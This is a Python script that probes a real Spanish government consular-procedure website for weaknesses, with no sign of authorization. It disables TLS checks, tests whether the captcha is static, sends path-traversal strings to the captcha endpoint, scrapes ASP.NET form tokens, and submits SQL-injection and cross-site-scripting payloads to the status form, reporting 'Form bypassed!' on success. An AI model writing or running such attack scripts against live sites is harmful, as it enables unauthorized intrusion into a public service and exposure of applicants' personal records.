#!/usr/bin/env python3
import requests
import time
import hashlib
from PIL import Image
import io
import base64

def analyze_captcha():
    session = requests.Session()
    session.verify = False
    
    # Disable SSL warnings
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    base_url = "https://sutramiteconsular.maec.es"
    
    print("[+] Analyzing captcha generation patterns...")
    
    # Test multiple captcha generations
    captchas = []
    for i in range(5):
        r = session.get(f"{base_url}/CaptchaHome.aspx?r={8500+i}")
        if r.status_code == 200:
            captchas.append({
                'param': 8500+i,
                'content': r.content,
                'headers': dict(r.headers)
            })
            print(f"[+] Captcha {i+1}: param=r={8500+i}, size={len(r.content)} bytes")
    
    # Analyze patterns
    print("\n[+] Analyzing patterns...")
    
    # Check if captcha is predictable
    if len(captchas) > 1:
        if captchas[0]['content'] == captchas[1]['content']:
            print("[!] CAPTCHA IS STATIC - VULNERABLE!")
        else:
            print("[+] Captcha appears to be dynamic")
    
    # Test for parameter manipulation
    print("\n[+] Testing parameter manipulation...")
    
    # Test with different parameters
    test_params = [
        "r=null",
        "r=",
        "r=0",
        "r=999999",
        "r=abc",
        "r=../../",
        "r=../",
        "r=..%2f..%2f",
        "r=..%5c..%5c",
        "r=..%252f..%252f",
        "r=..%255c..%255c"
    ]
    
    for param in test_params:
        try:
            r = session.get(f"{base_url}/CaptchaHome.aspx?{param}")
            print(f"[+] {param}: {r.status_code} - {len(r.content)} bytes")
        except Exception as e:
            print(f"[+] {param}: Error - {e}")
    
    return session

def test_form_submission(session):
    print("\n[+] Testing form submission bypass...")
    
    # Get the main page to extract form tokens
    r = session.get("https://sutramiteconsular.maec.es/")
    
    # Extract __VIEWSTATE and other tokens
    import re
    viewstate_match = re.search(r'name="__VIEWSTATE" id="__VIEWSTATE" value="([^"]+)"', r.text)
    eventvalidation_match = re.search(r'name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="([^"]+)"', r.text)
    
    if viewstate_match:
        viewstate = viewstate_match.group(1)
        print(f"[+] Found __VIEWSTATE: {viewstate[:50]}...")
    
    if eventvalidation_match:
        eventvalidation = eventvalidation_match.group(1)
        print(f"[+] Found __EVENTVALIDATION: {eventvalidation[:50]}...")
    
    # Test form submission with various payloads
    test_payloads = [
        {"infServicio": "VISADO", "txIdentificador": "TEST123", "txtFechaNacimiento": "1990", "imgcaptcha": "123456"},
        {"infServicio": "PASAPORTE", "txIdentificador": "TEST123", "txtFechaNacimiento": "1990", "imgcaptcha": "123456"},
        {"infServicio": "VISADO", "txIdentificador": "' OR '1'='1", "txtFechaNacimiento": "1990", "imgcaptcha": "123456"},
        {"infServicio": "VISADO", "txIdentificador": "'; DROP TABLE users; --", "txtFechaNacimiento": "1990", "imgcaptcha": "123456"},
        {"infServicio": "VISADO", "txIdentificador": "<script>alert('xss')</script>", "txtFechaNacimiento": "1990", "imgcaptcha": "123456"},
    ]
    
    for i, payload in enumerate(test_payloads):
        print(f"\n[+] Testing payload {i+1}: {payload}")
        
        # Add form tokens
        form_data = {
            "__VIEWSTATE": viewstate if viewstate_match else "",
            "__EVENTVALIDATION": eventvalidation if eventvalidation_match else "",
            "imgVerSuTramite.x": "0",
            "imgVerSuTramite.y": "0"
        }
        form_data.update(payload)
        
        try:
            r = session.post("https://sutramiteconsular.maec.es/", data=form_data)
            print(f"    Status: {r.status_code}")
            print(f"    Content length: {len(r.content)}")
            
            # Check for error messages or successful bypass
            if "error" in r.text.lower() or "error" in r.text.lower():
                print(f"    [!] Error detected in response")
            if "trámite" in r.text.lower() and "estado" in r.text.lower():
                print(f"    [!] SUCCESS - Form bypassed!")
                
        except Exception as e:
            print(f"    Error: {e}")

if __name__ == "__main__":
    session = analyze_captcha()
    test_form_submission(session)